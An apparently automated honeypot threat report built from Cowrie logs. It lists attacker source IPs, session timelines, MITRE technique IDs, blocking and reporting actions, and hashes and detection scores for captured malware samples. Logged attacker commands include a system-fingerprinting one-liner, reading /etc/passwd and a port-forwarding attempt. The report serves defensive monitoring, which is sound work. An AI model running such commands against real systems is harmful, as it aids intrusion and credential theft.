| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:27:20` | `cowrie.session.connect` |
| `2026-09-06 06:27:20` | `cowrie.client.version` |
| `2026-09-06 06:27:20` | `cowrie.client.kex` |
| `2026-09-06 06:27:22` | `cowrie.login.success` |
| `2026-09-06 06:27:23` | `cowrie.session.params` |
| `2026-09-06 06:27:23` | `cowrie.command.input` |
| `2026-09-06 06:27:24` | `cowrie.log.closed` |
| `2026-09-06 06:27:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1260d1d7f3ac

| Field | Detail |
|---|---|
| **Source IP** | `124.243.191[.]241` |
| **First Seen** | 2026-09-06 06:27 |
| **Last Seen** | 2026-09-06 06:28 |
| **Session Duration** | 69s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:27:48` | `cowrie.session.connect` |
| `2026-09-06 06:27:50` | `cowrie.telnet.option` |
| `2026-09-06 06:27:52` | `cowrie.telnet.option` |
| `2026-09-06 06:27:52` | `cowrie.login.success` |
| `2026-09-06 06:27:53` | `cowrie.session.params` |
| `2026-09-06 06:27:54` | `cowrie.telnet.option` |
| `2026-09-06 06:27:54` | `cowrie.telnet.option` |
| `2026-09-06 06:27:54` | `cowrie.command.input` |
| `2026-09-06 06:27:54` | `cowrie.command.input` |
| `2026-09-06 06:27:54` | `cowrie.command.input` |
| `2026-09-06 06:27:56` | `cowrie.command.input` |
| `2026-09-06 06:27:56` | `cowrie.command.failed` |
| `2026-09-06 06:27:56` | `cowrie.command.input` |
| `2026-09-06 06:27:56` | `cowrie.command.failed` |
| `2026-09-06 06:27:56` | `cowrie.command.input` |
| `2026-09-06 06:27:56` | `cowrie.command.failed` |
| `2026-09-06 06:27:56` | `cowrie.command.input` |
| `2026-09-06 06:27:56` | `cowrie.command.input` |
| `2026-09-06 06:27:56` | `cowrie.command.input` |
| `2026-09-06 06:27:56` | `cowrie.command.input` |
| `2026-09-06 06:27:56` | `cowrie.command.failed` |
| `2026-09-06 06:27:56` | `cowrie.command.input` |
| `2026-09-06 06:27:56` | `cowrie.command.failed` |
| `2026-09-06 06:27:56` | `cowrie.command.input` |
| `2026-09-06 06:27:56` | `cowrie.command.failed` |
| `2026-09-06 06:27:56` | `cowrie.command.input` |
| `2026-09-06 06:27:56` | `cowrie.command.failed` |
| `2026-09-06 06:27:56` | `cowrie.command.input` |
| `2026-09-06 06:27:56` | `cowrie.command.input` |
| `2026-09-06 06:27:56` | `cowrie.command.failed` |
| `2026-09-06 06:27:56` | `cowrie.command.input` |
| `2026-09-06 06:27:56` | `cowrie.command.input` |
| `2026-09-06 06:28:58` | `cowrie.log.closed` |
| `2026-09-06 06:28:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.243.191[.]241` to AbuseIPDB if not already reported
- [ ] Block `124.243.191[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-194275172229

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-06 06:28 |
| **Last Seen** | 2026-09-06 06:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:28:58` | `cowrie.session.connect` |
| `2026-09-06 06:28:58` | `cowrie.client.version` |
| `2026-09-06 06:28:58` | `cowrie.client.kex` |
| `2026-09-06 06:29:00` | `cowrie.login.success` |
| `2026-09-06 06:29:01` | `cowrie.session.params` |
| `2026-09-06 06:29:01` | `cowrie.command.input` |
| `2026-09-06 06:29:02` | `cowrie.log.closed` |
| `2026-09-06 06:29:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-726d787c5625

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-06 06:37 |
| **Last Seen** | 2026-09-06 06:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:37:14` | `cowrie.session.connect` |
| `2026-09-06 06:37:14` | `cowrie.client.version` |
| `2026-09-06 06:37:14` | `cowrie.client.kex` |
| `2026-09-06 06:37:15` | `cowrie.login.success` |
| `2026-09-06 06:37:15` | `cowrie.direct-tcpip.request` |
| `2026-09-06 06:37:15` | `cowrie.direct-tcpip.data` |
| `2026-09-06 06:37:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e10c6a3d247

| Field | Detail |
|---|---|
| **Source IP** | `34.156.92[.]167` |
| **First Seen** | 2026-09-06 06:46 |
| **Last Seen** | 2026-09-06 06:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:46:47` | `cowrie.session.connect` |
| `2026-09-06 06:46:47` | `cowrie.login.success` |
| `2026-09-06 06:46:48` | `cowrie.session.params` |
| `2026-09-06 06:46:48` | `cowrie.command.input` |
| `2026-09-06 06:46:48` | `cowrie.command.input` |
| `2026-09-06 06:46:48` | `cowrie.command.failed` |
| `2026-09-06 06:46:48` | `cowrie.command.input` |
| `2026-09-06 06:46:48` | `cowrie.log.closed` |
| `2026-09-06 06:46:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.92[.]167` to AbuseIPDB if not already reported
- [ ] Block `34.156.92[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae7e5e654202

| Field | Detail |
|---|---|
| **Source IP** | `34.156.92[.]167` |
| **First Seen** | 2026-09-06 06:46 |
| **Last Seen** | 2026-09-06 06:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:46:56` | `cowrie.session.connect` |
| `2026-09-06 06:46:56` | `cowrie.login.success` |
| `2026-09-06 06:46:56` | `cowrie.session.params` |
| `2026-09-06 06:46:56` | `cowrie.command.input` |
| `2026-09-06 06:46:56` | `cowrie.command.failed` |
| `2026-09-06 06:47:02` | `cowrie.log.closed` |
| `2026-09-06 06:47:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.92[.]167` to AbuseIPDB if not already reported
- [ ] Block `34.156.92[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-162d4988e767

| Field | Detail |
|---|---|
| **Source IP** | `34.156.92[.]167` |
| **First Seen** | 2026-09-06 06:46 |
| **Last Seen** | 2026-09-06 06:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:46:58` | `cowrie.session.connect` |
| `2026-09-06 06:46:58` | `cowrie.login.success` |
| `2026-09-06 06:46:58` | `cowrie.session.params` |
| `2026-09-06 06:46:58` | `cowrie.command.input` |
| `2026-09-06 06:47:02` | `cowrie.log.closed` |
| `2026-09-06 06:47:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.92[.]167` to AbuseIPDB if not already reported
- [ ] Block `34.156.92[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ed1e1313d23

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 06:51 |
| **Last Seen** | 2026-09-06 06:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:51:28` | `cowrie.session.connect` |
| `2026-09-06 06:51:29` | `cowrie.client.version` |
| `2026-09-06 06:51:29` | `cowrie.client.kex` |
| `2026-09-06 06:51:32` | `cowrie.login.success` |
| `2026-09-06 06:51:34` | `cowrie.session.params` |
| `2026-09-06 06:51:34` | `cowrie.command.input` |
| `2026-09-06 06:51:35` | `cowrie.log.closed` |
| `2026-09-06 06:51:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29edca831bf5

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 06:54 |
| **Last Seen** | 2026-09-06 06:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 06:54:00` | `cowrie.session.connect` |
| `2026-09-06 06:54:00` | `cowrie.client.version` |
| `2026-09-06 06:54:00` | `cowrie.client.kex` |
| `2026-09-06 06:54:02` | `cowrie.login.success` |
| `2026-09-06 06:54:04` | `cowrie.session.params` |
| `2026-09-06 06:54:04` | `cowrie.command.input` |
| `2026-09-06 06:54:05` | `cowrie.log.closed` |
| `2026-09-06 06:54:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.156.92[.]167` | **29** | 2026-09-06 06:46 | 2026-09-06 06:47 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `34.78.143[.]59` | **8** | 2026-09-06 03:34 | 2026-09-06 03:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **4** | 2026-09-06 03:07 | 2026-09-06 06:07 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `217.60.255[.]130` | **4** | 2026-09-06 03:30 | 2026-09-06 06:11 | 1m | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]84` | **3** | 2026-09-06 04:00 | 2026-09-06 05:31 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `51.171.177[.]105` | **3** | 2026-09-06 04:50 | 2026-09-06 04:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]35` | **3** | 2026-09-06 02:58 | 2026-09-06 02:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]62` | **3** | 2026-09-06 02:58 | 2026-09-06 02:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]86` | **3** | 2026-09-06 02:56 | 2026-09-06 02:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `76.32.20[.]66` | **3** | 2026-09-06 03:33 | 2026-09-06 03:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.136.206[.]218` | **2** | 2026-09-06 05:33 | 2026-09-06 05:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `109.105.210[.]87` | **2** | 2026-09-06 03:25 | 2026-09-06 03:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `115.190.53[.]236` | **2** | 2026-09-06 05:17 | 2026-09-06 05:19 | 2m | 0 | `T1592` | 🟢 LOW |
| `221.194.148[.]77` | **2** | 2026-09-06 03:07 | 2026-09-06 03:12 | 4m | 0 | `T1592` | 🟢 LOW |
| `223.105.83[.]132` | **2** | 2026-09-06 04:47 | 2026-09-06 04:49 | 2m | 0 | `T1592` | 🟢 LOW |
| `5.152.58[.]234` | **2** | 2026-09-06 05:24 | 2026-09-06 05:25 | 0m | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | **2** | 2026-09-06 04:57 | 2026-09-06 06:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.102.228[.]123` | **2** | 2026-09-06 05:05 | 2026-09-06 05:06 | 2m | 0 | `T1592` | 🟢 LOW |
| `89.211.151[.]35` | **2** | 2026-09-06 06:01 | 2026-09-06 06:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]2` | 1 | 2026-09-06 05:16 | 2026-09-06 05:16 | 10s | 0 | `T1592` | 🟢 LOW |
| `109.105.209[.]8` | 1 | 2026-09-06 03:20 | 2026-09-06 03:20 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.105.210[.]88` | 1 | 2026-09-06 03:25 | 2026-09-06 03:25 | 5s | 0 | `T1592` | 🟢 LOW |
| `111.175.88[.]6` | 1 | 2026-09-06 06:11 | 2026-09-06 06:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-09-06 05:27 | 2026-09-06 05:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `131.123.40[.]77` | 1 | 2026-09-06 05:29 | 2026-09-06 05:30 | 29s | 0 | `T1592` | 🟢 LOW |
| `168.205.14[.]132` | 1 | 2026-09-06 05:41 | 2026-09-06 05:41 | 10s | 0 | `T1592` | 🟢 LOW |
| `194.88.98[.]107` | 1 | 2026-09-06 06:51 | 2026-09-06 06:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.112.142[.]51` | 1 | 2026-09-06 04:01 | 2026-09-06 04:01 | 10s | 0 | `T1592` | 🟢 LOW |
| `200.69.35[.]17` | 1 | 2026-09-06 04:35 | 2026-09-06 04:35 | 10s | 0 | `T1592` | 🟢 LOW |
| `213.177.179[.]195` | 1 | 2026-09-06 04:37 | 2026-09-06 04:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.219.234[.]85` | 1 | 2026-09-06 06:32 | 2026-09-06 06:32 | 12s | 0 | `T1592` | 🟢 LOW |
| `27.155.103[.]100` | 1 | 2026-09-06 03:53 | 2026-09-06 03:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `35.189.208[.]114` | 1 | 2026-09-06 03:34 | 2026-09-06 03:34 | 3s | 0 | `T1592` | 🟢 LOW |
| `45.63.4[.]69` | 1 | 2026-09-06 04:10 | 2026-09-06 04:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.211[.]97` | 1 | 2026-09-06 06:39 | 2026-09-06 06:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]197` | 1 | 2026-09-06 06:07 | 2026-09-06 06:07 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]230` | 1 | 2026-09-06 03:49 | 2026-09-06 03:49 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]48` | 1 | 2026-09-06 05:20 | 2026-09-06 05:20 | 2s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-09-06 06:20 | 2026-09-06 06:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.87.134[.]131` | 1 | 2026-09-06 06:18 | 2026-09-06 06:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]234` | 1 | 2026-09-06 06:40 | 2026-09-06 06:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]79` | 1 | 2026-09-06 06:51 | 2026-09-06 06:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]11` | 1 | 2026-09-06 04:38 | 2026-09-06 04:38 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
